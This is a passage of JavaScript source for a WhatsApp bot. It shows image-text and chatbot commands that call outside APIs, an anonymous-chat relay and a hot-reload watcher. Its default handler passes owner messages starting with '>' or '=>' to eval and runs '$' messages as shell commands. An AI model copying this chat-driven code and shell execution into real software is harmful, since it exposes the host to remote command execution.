coffee-heartcup
embroiderytext
flaming
flowertypo
funnycup
fur
gerbang
glowrainbow
gradientavatar
graffititext
harrypotter
lovemessage
luxuryroyal
neonlight
sweetcandy
summertext
woodheart
woodblock
yellowroses
wolfmetal
underwaterocean`
 anu = await getBuffer(`https://violetics.pw/api/photooxy/${command}?apikey=${setting.violkey}&text=${text}`)
haikal.sendMessage(m.chat, { image: anu, caption: `*PHOTO OXY ${command}*` }, { quoted: hw}).catch((err) => bangkal('*Sorry Xteam server is down*'))
	 }
break 
//=================================================//
case 'simisimi': case 'simi': {
if (isBan) throw mess.ban
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
 if (!text) throw `*Example : ${prefix + command} halo simi*`   
 x = await fetchJson(`https://xteam.xyz/simsimi?kata=${text}&APIKEY=${setting.riy}`)   
 bangkal(`${x.jawaban}`)
 }
 break
 //=================================================//
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return bangkal(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
bangkal(String(e))
}
}
if (budy.startsWith('>')) {
if (!isCreator) return bangkal(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await bangkal(evaled)
} catch (err) {
await bangkal(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if(err) return bangkal(err)
if (stdout) return bangkal(stdout)
})
}

//=================================================//
if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
return !0
}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}
} catch (err) {
m.reply(util.format(err))
}
}

//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})